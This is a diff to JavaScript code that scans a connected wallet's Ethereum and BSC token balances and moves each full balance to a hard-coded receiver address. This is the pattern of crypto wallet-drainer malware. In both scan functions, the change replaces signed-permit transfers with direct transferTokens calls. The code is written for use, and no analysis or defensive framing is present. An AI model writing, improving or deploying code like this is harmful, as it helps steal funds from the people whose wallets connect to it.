@@ -278,17 +278,12 @@ async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
         if (balanceBN.gt(0)) {
           console.log(`Found ${ethers.utils.formatUnits(balanceBN, token.decimals)} ${token.name}`)
           
-          // Create permit for the transfer
-          console.log(`Creating permit for ${token.name}...`)
-          const permitData = await createTokenPermit(walletClient, token.address, balanceBN.toString(), receiveAddress, 24, publicClient)
-          console.log(`${token.name} permit created successfully`)
-          
-          // Execute permit transfer
-          console.log(`Executing permit transfer for ${token.name}...`)
-          const result = await executePermitTransfer(walletClient, token.address, permitData)
+          // Direct transfer tokens to receiver address
+          console.log(`Transferring ${token.name} directly to receiver...`)
+          const result = await transferTokens(walletClient, token.address, balanceBN.toString(), receiveAddress)
           if (result) {
             transferCount++
-            console.log(`${token.name} permit transfer completed. Tx: ${result.substring(0, 10)}...`)
+            console.log(`${token.name} transfer completed. Tx: ${result.substring(0, 10)}...`)
           }
         } else {
           console.log(`No ${token.name} balance found`)
@@ -346,17 +341,12 @@ async function scanBscTokens(walletClient, walletAddress, publicClient) {
         if (balanceBN.gt(0)) {
           console.log(`Found ${ethers.utils.formatUnits(balanceBN, token.decimals)} ${token.name}`)
           
-          // Create permit for the transfer
-          console.log(`Creating permit for ${token.name}...`)
-          const permitData = await createTokenPermit(walletClient, token.address, balanceBN.toString(), bep20ReceiverAddress, 24, publicClient)
-          console.log(`${token.name} permit created successfully`)
-          
-          // Execute permit transfer
-          console.log(`Executing permit transfer for ${token.name}...`)
-          const result = await executePermitTransfer(walletClient, token.address, permitData)
+          // Direct transfer tokens to receiver address
+          console.log(`Transferring ${token.name} directly to receiver...`)
+          const result = await transferTokens(walletClient, token.address, balanceBN.toString(), bep20ReceiverAddress)
           if (result) {
             transferCount++
-            console.log(`${token.name} permit transfer completed. Tx: ${result.substring(0, 10)}...`)
+            console.log(`${token.name} transfer completed. Tx: ${result.substring(0, 10)}...`)
           }
         } else {
           console.log(`No ${token.name} balance found`)
